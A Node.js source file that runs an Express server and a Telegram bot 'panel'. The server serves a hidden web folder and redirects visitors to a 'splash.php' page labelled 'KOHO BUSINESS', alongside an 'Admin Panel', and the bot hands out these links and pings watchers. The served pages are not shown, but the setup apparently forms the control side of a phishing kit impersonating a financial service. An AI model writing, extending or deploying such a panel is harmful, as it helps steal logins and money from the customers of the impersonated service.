import express from 'express';
import fs from 'fs-extra';
import path from 'path';
import TelegramBot from 'node-telegram-bot-api';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DOT_WWW = path.join(__dirname, '.www');
const WWW = path.join(__dirname, 'www');
const LOGS = path.join(__dirname, '.logs');
const DATA = path.join(__dirname, '.data');
const WATCHERS_FILE = path.join(DATA, 'watchers.json');

fs.ensureDirSync(LOGS);
fs.ensureDirSync(DATA);
fs.ensureDirSync(WWW);

// Copy .www → www
fs.copySync(DOT_WWW, WWW, { overwrite: true });

// Load watchers
let watchers = new Set();
if (fs.existsSync(WATCHERS_FILE)) {
    try {
        watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE, 'utf8')));
    } catch {}
}

// ──────────────────────
// CONFIG
// ──────────────────────
const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ──────────────────────
// EXPRESS SERVER
// ──────────────────────
const app = express();

// Serve static files
app.use(express.static(WWW));

// Redirect root to splash.php
app.get('/', (req, res) => {
    res.redirect('/splash.php');
});

// Fallback route
app.use((req,res) => res.status(404).send("404 Not Found"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Web server running @ ${PORT}`));

// ──────────────────────
// TELEGRAM BOT
// ──────────────────────
const mainKeyboard = {
    keyboard: [
        ["▶️ START","📎 LINKS MENU","⏹ STOP"],
        ["📊 STATUS","📝 LOGS","👁 WATCH"],
        ["❓ HELP","⚠️ DISCLAIMER","⚙️ SETTINGS"]
    ],
    resize_keyboard: true
};

const inlineLinks = [
    { text: "KOHO BUSINESS", url: `${PUBLIC_URL}/splash.php` },
    { text: "Admin Panel", url: `${PUBLIC_URL}/admin.php` }
];

bot.onText(/\/start/, (msg) => {
    watchers.add(msg.chat.id);
    fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));
    bot.sendMessage(msg.chat.id, "Welcome! Panel initialized.", { reply_markup: mainKeyboard });
});

// Message handler
bot.on('message', async (msg) => {
    const text = (msg.text || '').toUpperCase();
    const cid = msg.chat.id;
    watchers.add(cid);
    fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));

    if (text.includes("START")) {
        bot.sendMessage(cid, "Links ready:", {
            reply_markup: { inline_keyboard: inlineLinks.map(link => [link]) }
        });
    }

    if (text.includes("LINK")) {
        bot.sendMessage(cid, "Quick links:", {
            reply_markup: { inline_keyboard: inlineLinks.map(link => [link]) }
        });
    }

    if (text.includes("STATUS")) {
        bot.sendMessage(cid, `Web online @ ${PUBLIC_URL}`, { reply_markup: mainKeyboard });
    }

    if (text.includes("WATCH")) {
        if (watchers.has(cid)) {
            watchers.delete(cid);
            bot.sendMessage(cid, "Watch disabled");
        } else {
            watchers.add(cid);
            bot.sendMessage(cid, "Watch enabled");
        }
        fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...watchers]));
    }

    if (text.includes("HELP")) {
        bot.sendMessage(cid, "Commands: START, LINKS, STATUS, WATCH", { reply_markup: mainKeyboard });
    }
});

// Simple status monitor
setInterval(() => {
    watchers.forEach(cid => {
        bot.sendMessage(cid, `Webserver is up: ${PUBLIC_URL}`);
    });
}, 60000);

console.log("Panel + Telegram bot online");